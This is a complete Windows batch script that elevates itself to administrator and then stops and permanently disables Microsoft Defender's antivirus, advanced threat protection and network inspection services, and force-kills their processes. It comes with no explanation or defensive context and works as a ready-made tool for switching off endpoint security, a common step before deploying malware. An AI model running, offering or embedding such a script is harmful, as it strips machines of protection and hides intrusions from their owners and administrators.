@echo off
:: Check for administrative permissions
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Running with administrative privileges.
) else (
    echo Requesting administrative privileges...
    powershell start -verb runas '%0'
    exit /b
)

:: Stop Microsoft Defender Antivirus Service
sc stop WinDefend
sc config WinDefend start= disabled

:: Stop Microsoft Defender Advanced Threat Protection Service
sc stop Sense
sc config Sense start= disabled

:: Stop Microsoft Defender Network Inspection Service
sc stop WdNisSvc
sc config WdNisSvc start= disabled

:: Kill Microsoft Defender processes
taskkill /F /IM MsMpEng.exe
taskkill /F /IM NisSrv.exe

echo Microsoft Defender services stopped and disabled.
pause
